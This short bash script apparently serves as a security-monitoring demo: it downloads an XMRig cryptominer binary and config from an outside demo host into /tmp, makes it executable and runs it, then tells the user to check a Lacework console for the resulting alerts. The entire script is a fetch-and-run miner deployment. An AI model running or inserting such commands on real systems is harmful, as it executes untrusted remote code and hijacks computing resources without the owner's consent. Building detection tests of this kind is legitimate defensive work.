#!/usr/bin/env bash

set -e

red=$'\e[1;31m'
grn=$'\e[1;32m'
yel=$'\e[1;33m'
blu=$'\e[1;34m'
mag=$'\e[1;35m'
cyn=$'\e[1;36m'
end=$'\e[0m'

if [ ! -f /tmp/xmrig-demo ]; then
        echo "[INFO] XMRig not found, downloading XMRig now"
        curl http://lwmalwaredemo.com/xmrig -o /tmp/xmrig-demo
        curl http://lwmalwaredemo.com/config.json -o /tmp/config-demo.json
        chmod +x /tmp/xmrig-demo
else
	echo "[INFO] XMRig present, skipping download"
fi

if [ $(ps -ef | grep -v grep | grep xmrig-demo | awk '{print $2}'| wc -l) = "0" ]; then
        echo "[INFO] XMRig not running, starting now"
        /tmp/xmrig-demo -c /tmp/config-demo.json
else
	echo "[INFO] XMRig already running"
fi

echo ""
echo "${cyn}Script complete. Check your Lacework console for activity in about an hour.${end}"